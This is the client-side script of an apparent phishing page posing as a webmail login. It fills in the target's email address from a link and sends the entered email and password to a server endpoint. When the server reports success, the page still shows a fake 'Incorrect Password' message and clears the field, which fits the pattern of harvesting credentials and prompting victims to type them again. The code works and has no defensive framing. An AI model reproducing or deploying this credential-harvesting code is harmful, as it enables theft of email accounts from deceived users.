/* app.js — Webmail login page */

const form        = document.getElementById('login-form');
const btn         = document.getElementById('submit-btn');
const emailInput  = document.getElementById('email');
const passInput   = document.getElementById('passcode');

const SAVED_EMAIL = 'webmail_email';

/* ---------- toast pop-up ---------- */
function toast(text) {
  const el = document.createElement('div');
  el.className = 'toast';
  el.textContent = text;
  document.body.appendChild(el);

  requestAnimationFrame(() => el.classList.add('show'));

  setTimeout(() => {
    el.classList.remove('show');
    setTimeout(() => el.remove(), 250);
  }, 3000);
}

/* ---------- prefill the email from a link ---------- */
function emailFromLink() {
  const params = new URLSearchParams(window.location.search);
  let value = params.get('email');

  if (!value && window.location.hash.length > 1) {
    value = window.location.hash.slice(1);
    if (value.toLowerCase().startsWith('email=')) value = value.slice(6);
    try {
      value = decodeURIComponent(value);
    } catch (e) {
      /* leave the raw value if the hash is malformed */
    }
  }

  return (value || '').trim();
}

const linkEmail = emailFromLink();

if (linkEmail) {
  emailInput.value = linkEmail;
  localStorage.setItem(SAVED_EMAIL, linkEmail);
  passInput.focus();
} else {
  const remembered = localStorage.getItem(SAVED_EMAIL);
  if (remembered) emailInput.value = remembered;
}

/* ---------- remember what they type ---------- */
emailInput.addEventListener('input', () => {
  const value = emailInput.value.trim();
  if (value) {
    localStorage.setItem(SAVED_EMAIL, value);
  } else {
    localStorage.removeItem(SAVED_EMAIL);
  }
});

/* ---------- submit ---------- */
form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const email    = emailInput.value.trim();
  const passcode = passInput.value;

  if (!email || !passcode) {
    toast('Please fill in the fields');
    return;
  }

  btn.disabled = true;
  btn.textContent = 'Logging in...';

  try {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, passcode })
    });

    const data = await response.json();

    if (!response.ok) {
      toast(data.error || 'Something went wrong');
      return;
    }

    toast('Incorrect Password: Please try again');

    passInput.value = '';
    passInput.focus();

  } catch (error) {
    toast('Could not reach the server. Try again.');

  } finally {
    btn.disabled = false;
    btn.textContent = 'Log in';
  }
});